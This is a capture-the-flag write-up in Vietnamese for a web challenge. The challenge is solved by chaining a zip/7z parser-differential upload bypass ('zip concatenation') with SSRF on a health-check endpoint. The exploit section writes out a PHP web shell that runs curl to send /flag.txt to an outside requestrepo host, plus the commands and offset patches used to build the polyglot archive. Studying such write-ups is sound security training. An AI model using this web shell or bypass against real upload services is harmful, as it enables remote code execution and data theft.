

# ⚔️ ZC-1
**Category:** Web
**Difficulty:** _
**Author:** _
**Description**: _
**Resource**: _

![image](https://hackmd.io/_uploads/S1omJ7XAex.png)


# 🛰️Recon
## Tổng quan chung: 
Challenge bao gồm 2 ứng dụng web với:
- app1 là ứng dụng web Python cho phép đăng kí, đăng nhập, và upload file zip, ứng dụng được expose với port 8080
- app2 là ứng dụng web Php phục vụ cho việc giải nén là lưu trữ các file vừa upload, ứng dụng không thể truy cập từ bên ngoài mà chỉ có thể thông qua app1 hoặc từ bên trong

## Chi tiết
### App1
Ứng dụng bao gồm các endpoint sau (bỏ qua một số chi tiết không quan trọng):
- POST `/gateway/user` : cho phép người đăng kí với các trường username, password
- POST `/gateway/transport` : cho phép người dùng đã xác thực upload file zip
    - Endpoint này sử dụng thư viện `zipfile` trong python để thực hiện kiểm tra file extension của các file entry trong file zip được upload dựa trên whilelist trước khi gửi nó đến endpoint `upload.php` của app2
- GET `/gateway/health` : nhận vào param `module` cho phép người dùng kiểm tra hoạt động của các endpoint tại app2
- POST `auth/token` : thực hiện xác thực người dùng với username và password, trả vể session token (sử dụng cho việc xác thực) và refresh token

### App2
Ứng dụng bao gồm các endpoint sau
- POST `upload.php`: cho phép upload file zip (từ app1) và thực hiện giải nén file zip và lưu các file sau khi đã giải nén trong folder `upload/<user_id>`
- `health.php`: một file rỗng chỉ nhằm mục đích kiểm tra kết nối, hoạt động của app2

# 🧪 Dig & Analyze
Dựa trên cấu trúc của challenge, hệ thống cho phép upload file zip sau đó thực hiện giải nén và lưu trữ các file entry trong ứng dụng web Php (thư mục lưu trữ file không có cấu hình để ngăn việc thực thi file .php). Vậy mục tiêu challenge ở đây khả năng cao là upload web shell thông qua việc upload file zip chứa file entry nguy hiểm. 

Dựa trên mục tiêu trên, có 2 vấn đề cần giải quyết:
## 1. Làm thế nào để bypass được file extension check ở app1 -> Zip Concatenation
Trong khi app1 thực hiện kiểm tra file zip upload với thư viện `zipfile` thì app2 lại sử dụng `Archive7z\Archive7z` hay công cụ `7z` để thực hiện giải nén file zip. 

>Bạn có thể chủ động tìm hiểu thêm về cấu trúc file zip để hiểu rõ hơn bài wriuteup, bài wriueup không đi sâu vào phân tích cấu trúc file zip hay giải thích cụ thể về lỗ hổng zip concatenation

Đi vào chi tiết hơn cách mà 2 trình zip parser này hoạt động:

- **Đối với `python zipfile`**, trình đọc zip này không bắt đầu đọc từ đầu tệp mà thay vào đó, nó quét ngược từ cuối file để tìm kiếm lần lượt **End of Central Directory**,  **Central Directory**, **file entry** dựa trên offset.
    ![image](https://hackmd.io/_uploads/rkWyeumCll.png)
- **Đối với `7z`**, định dạng này đặt signature và các header của nó ở đầu tệp. Công cụ 7z bắt đầu phân tích file zip từ đầu tệp (offset = 0)
    ![image](https://hackmd.io/_uploads/SJBGg_QRgl.png)
    
-> Điểm không đồng nhất ở đây cùng với hình ảnh mô tả của challenge gợi cho tôi ý tưởng về việc tận dụng điểm khác biệt của 2 trình zip parser để tạo một file zip hợp lệ với cả 2 trình parser tuy nhiên nội dung đọc được của chúng lại khác nhau bởi cơ chế phân tích của chúng khác nhau.

Tìm hiểu thêm một vài kĩ thuật tấn công liên quan đến định dạng file Zip tôi tìm được kĩ thuật **Zip Concatenation** phù hợp với tình huống lỗ hổng này

## 2. Làm thế nào để có thể thực thi file php nếu đã upload được thành công -> SSRF
Ứng dụng app1 cho phép kiểm tra hoạt động của backend tại endpoint GET `/gateway/health`. Endpoint này nhận vào params `module`, input này được nối chuỗi vào `storage_url` mà không qua kiểm tra sàng lọc dẫn đến có thể khai thác SSRF ở đây để gọi đến file php được upload -> Thực thi thành công file .php
![image](https://hackmd.io/_uploads/HkQzR770lx.png)

# 🔥 Exploit

## Tạo payload
1. Tạo file zip an toàn chứa các file entry phù hợp với whitelist của challenge
```bash
echo helloworld > user.txt
zip user.zip user.txt >/dev/null
```
2. Tạo 7z archive chứa web shell 
```bash
echo '<?php system("curl https://w4zhdt6e.requestrepo.com/ -F \"file=@/flag.txt\"") ?>' > shell.php
7z a -t7z evil.7z shell.php >/dev/null
```
![image](https://hackmd.io/_uploads/B1Fc8jmRxe.png)


File này có kích thước là 207 bytes (0xCF bytes)

3. Chỉnh sửa payload sao cho hợp lệ với zipfile

Chúng ta sẽ thực hiện nối 2 file đơn giản bằng việc sử dụng lệnh cat
```
cat evil.zip user.zip > zipconcat.zip
```

Tuy nhiên file zip này chưa hợp lệ bởi việc thêm trước file zip một file 7z sẽ khiến offset của phần user.zip bị thay đổi, do đó cần thực hiện chỉnh sửa offset sao cho payload này hợp lệ với zipfile


Các 2 vị trí offset cần thay đổi (9D bởi thêm vào trước file này 0x9D bytes) là:
- offset tới Central Directory:
    - nằm trong phần End of Centrol directory
    - có giá trị là 4D 
    - chỉnh sửa thành `11C = 4D + CF`
- offset tới Local file Header 
    - nằm tại offset 42 tình từ đầu mỗi Central Directory
    - có giá trị là 00 
    - chỉnh sửa thành `CF = 00 + CF`

![image](https://hackmd.io/_uploads/ByUSdi7Agl.png)

Trực tiếp thay đổi offset bằng việc sử dụng hex editor

![image](https://hackmd.io/_uploads/SJzXYoXRgx.png)

```bash
cat evil.7z user.zip > zipconcat.zip
```

4. Kiểm tra file với python zipfile
![image](https://hackmd.io/_uploads/Hkxtz5XCle.png)

5. Kiểm tra file zip với 7z
Vì tập lệnh đặt tệp lưu trữ 7z ở ngay đầu tệp được kết hợp, nên các công cụ 7z sẽ coi tệp được kết hợp như một tệp lưu trữ 7z bình thường và trích xuất nội dung 7z (tệp PHP trong ví dụ của bạn) mà không cần động đến các cấu trúc ZIP được thêm vào phía dưới
![image](https://hackmd.io/_uploads/BJcpMcQRxg.png)
Mặc dù có thông báo lỗi bởi 7z phát hiện còn các bytes ở cuối file nhưng payload vẫn được giải nén thành công
![image](https://hackmd.io/_uploads/r18ZQ5X0ee.png)

## Thực hiện tấn công
Tạo tài khoàn người dùng và lấy Authorization token (JWT):

![image](https://hackmd.io/_uploads/rycWGimRlg.png)


![image](https://hackmd.io/_uploads/H1i1zjQRxe.png)


Thực hiện upload file payload vừa tạo với Authorization header chứa token vừa lấy được

![image](https://hackmd.io/_uploads/ryTOMjmAex.png)


Thực hiện SSRF thể thực thi file php đã upload, tuy nhiên cần xác định được vị trí của file trên server

![image](https://hackmd.io/_uploads/Byhx3qmRxl.png)

File sau khi extract được lưu tại thư mục `upload/<user_id>`, chúng ta có thể dễ dàng tìm được user id trong JWT token

![image](https://hackmd.io/_uploads/r1lafjmCee.png)

Thực hiện SSRF

![image](https://hackmd.io/_uploads/SkFocoQRxx.png)

Mặc dù request trả về "ERR" nhưng chúng ta vẫn thành công lấy được flag

![image](https://hackmd.io/_uploads/r1wxjo70el.png)


# 🏆 EXP
-> Zip Concatenation


